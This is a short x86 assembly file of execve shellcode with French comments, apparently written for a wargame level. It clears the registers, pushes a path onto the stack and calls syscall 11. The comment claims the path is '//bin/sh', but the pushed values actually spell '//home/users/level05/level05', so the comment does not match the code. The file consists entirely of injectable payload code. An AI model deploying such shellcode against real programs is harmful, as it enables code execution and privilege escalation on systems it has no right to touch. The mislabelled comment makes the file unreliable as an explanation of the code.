section .bss

section .text
	global _start;

_start :
	; mise a 0 des registres
	xor eax, eax
	xor ecx, ecx
	xor edx, edx

	; on stoque "//bin/sh" sur la stack, a l'envers (parce que c'est une stack)
	push eax;			push 0
   push 0x35306c65
   push 0x76656c2f
   push 0x35306c65
   push 0x76656c2f
   push 0x73726573
   push 0x752f656d
   push 0x6f682f2f

	mov ebx, esp;		on met l'addresse de la stack en argument 1
	mov al, 0xb;		on selectionne le syscall 11, execve
	int 0x80;			on appelle syscall